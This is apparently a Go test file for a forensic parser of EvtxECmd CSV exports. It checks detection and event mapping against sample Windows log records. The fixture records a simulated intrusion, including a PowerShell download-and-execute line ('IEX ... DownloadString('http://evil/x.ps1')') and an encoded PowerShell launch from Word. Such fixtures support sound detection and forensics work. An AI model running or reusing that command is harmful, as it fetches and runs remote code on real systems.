package evtxcsv

import (
	"os"
	"path/filepath"
	"testing"

	"tracefall/internal/model"
)

func TestDetect(t *testing.T) {
	p := New()
	cases := map[string]bool{
		"EvtxECmd/20260115_EvtxECmd_Output.csv": true,
		"evtxecmd_output.CSV":                   true,
		"PECmd/20260115_PECmd_Output.csv":       false,
		"EvtxECmd/readme.txt":                   false,
	}
	for path, want := range cases {
		if got := p.Detect(path); got != want {
			t.Errorf("Detect(%q) = %v, want %v", path, got, want)
		}
	}
}

const sampleCSV = `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:00:00.0000000Z,4624,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,jdoe,-,Logon Success,"TargetUserName: jdoe; LogonType: 2; IpAddress: 127.0.0.1",,,,,,1
2026-01-15T09:14:47.0000000Z,4688,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,,-,Process Create,"NewProcessId: 0x1F30; NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; ParentProcessName: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE; ProcessId: 0x1A2C; CommandLine: powershell.exe -enc AAAA; SubjectUserName: jdoe",,,,,,2
2026-01-15T09:14:48.0000000Z,4104,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,WKSTN-042,jdoe,-,Script Block,"ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1'); ScriptBlockId: abc-123",,,,,,3
2026-01-15T09:18:05.0000000Z,3,Sysmon,Microsoft-Windows-Sysmon/Operational,WKSTN-042,jdoe,203.0.113.77,Network Connect,"Image: C:\Temp\update.exe; SourceIp: 10.0.0.5; DestinationIp: 203.0.113.77; DestinationPort: 443; ProcessId: 8260",,,,,,4
`

func writeTemp(t *testing.T, name, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestParse(t *testing.T) {
	path := writeTemp(t, "20260115_EvtxECmd_Output.csv", sampleCSV)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 4 {
		t.Fatalf("got %d events, want 4", len(res.Events))
	}
	if len(res.Raw) != len(res.Events) {
		t.Fatalf("got %d raw records, want %d", len(res.Raw), len(res.Events))
	}

	logon := res.Events[0]
	if logon.EventType != model.EventLogonSuccess {
		t.Errorf("event 0 type = %q, want %q", logon.EventType, model.EventLogonSuccess)
	}
	if logon.User != "jdoe" {
		t.Errorf("event 0 user = %q, want jdoe", logon.User)
	}
	if logon.Extra["logon_type"] != "2" {
		t.Errorf("event 0 logon_type = %q, want 2", logon.Extra["logon_type"])
	}

	proc := res.Events[1]
	if proc.EventType != model.EventProcessCreate {
		t.Errorf("event 1 type = %q, want %q", proc.EventType, model.EventProcessCreate)
	}
	if proc.ProcessName != "powershell.exe" {
		t.Errorf("event 1 process_name = %q, want powershell.exe (regression: space-containing parent path must not truncate ProcessName)", proc.ProcessName)
	}
	if proc.ParentProcessName != "winword.exe" {
		t.Errorf("event 1 parent_process = %q, want winword.exe", proc.ParentProcessName)
	}
	if proc.PID != 7984 { // 0x1F30
		t.Errorf("event 1 pid = %d, want 7984", proc.PID)
	}
	if proc.PPID != 6700 { // 0x1A2C
		t.Errorf("event 1 ppid = %d, want 6700", proc.PPID)
	}

	script := res.Events[2]
	if script.EventType != model.EventPowerShellScript {
		t.Errorf("event 2 type = %q, want %q", script.EventType, model.EventPowerShellScript)
	}

	net := res.Events[3]
	if net.EventType != model.EventNetworkConnection {
		t.Errorf("event 3 type = %q, want %q", net.EventType, model.EventNetworkConnection)
	}
	if net.NetworkDest != "203.0.113.77" {
		t.Errorf("event 3 network_dest = %q, want 203.0.113.77", net.NetworkDest)
	}
}

func TestParseUnknownEventIDSkipped(t *testing.T) {
	csv := `TimeCreated,EventId,Provider,Channel,ComputerName,UserName,RemoteHost,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,RecordNumber
2026-01-15T09:00:00.0000000Z,9999,Microsoft-Windows-Security-Auditing,Security,WKSTN-042,jdoe,-,Unknown Event,,,,,,,1
`
	path := writeTemp(t, "unknown_EvtxECmd_Output.csv", csv)
	res, err := New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 0 {
		t.Fatalf("got %d events for an unmapped channel/EventId, want 0", len(res.Events))
	}
}
